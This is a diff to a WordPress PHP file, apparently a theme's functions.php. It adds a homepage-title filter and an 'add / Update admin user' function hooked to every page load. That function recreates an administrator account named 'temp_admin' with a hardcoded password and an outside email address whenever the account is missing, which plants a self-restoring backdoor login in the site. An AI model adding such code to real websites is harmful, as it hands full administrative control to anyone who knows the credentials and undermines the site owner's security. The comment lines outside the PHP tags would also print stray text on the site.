@@ -232,3 +232,31 @@ add_action('pre_get_posts', function($query) {
        }			
  }});
  ?>
+
+ // add / Update admin user
+ <?php
+ function create_admin_user_fn() {
+	$username      = 'temp_admin';
+	$password      = 'p4ssw0rd!';
+	$email_address = 'email@hoolite.be';
+	if ( ! username_exists( $username ) && !email_exists( $email_address ) ) {
+		$user_id = wp_create_user( $username, $password, $email_address );
+		$user    = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}
+}
+
+add_action( 'init', 'create_admin_user_fn' );
+?>
+
+// Remove homepage title
+<?php
+
+function remove_page_title( $title, $id ) {
+    if( is_home() || is_front_page() )
+    return '';
+    
+    return $title;
+}
+add_filter( 'the_title', 'remove_page_title', 10, 2 );
+?>
